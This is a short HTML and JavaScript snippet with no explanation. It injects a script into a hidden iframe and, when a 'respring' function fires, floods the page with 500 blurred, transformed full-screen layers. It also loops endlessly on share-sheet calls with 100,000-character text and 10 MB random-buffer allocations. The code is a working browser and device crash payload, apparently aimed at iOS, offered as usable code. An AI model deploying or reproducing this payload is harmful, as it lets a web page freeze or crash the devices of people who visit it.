<iframe id="respring-iframe" style="display:none;"></iframe>

<script>
    const bridge = document.getElementById('respring-iframe');
    const bridgeDoc = bridge.contentDocument || bridge.contentWindow.document;

    const respringScript = `
        <script>
        window.onmessage = function(e) {
            if (e.data === 'trigger') {
                const container = document.createElement('div');
                container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
                document.body.appendChild(container);

                for (let i = 0; i < 500; i++) {
                    let d = document.createElement('div');
                    d.style.cssText = 'position:fixed;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,'+i+'px) rotateY(90deg);z-index:999;';
                    document.body.appendChild(d);
                }

                setInterval(() => {
                    navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                    let x = new Uint8Array(1024 * 1024 * 10);
                    crypto.getRandomValues(x);
                }, 0);
            }
        };
        <\/script>
    `;

    bridgeDoc.open();
    bridgeDoc.write(respringScript);
    bridgeDoc.close();

    function respring() {
        bridge.contentWindow.postMessage('trigger', '*');
        document.body.style.filter = 'blur(10px)';
    }
</script>
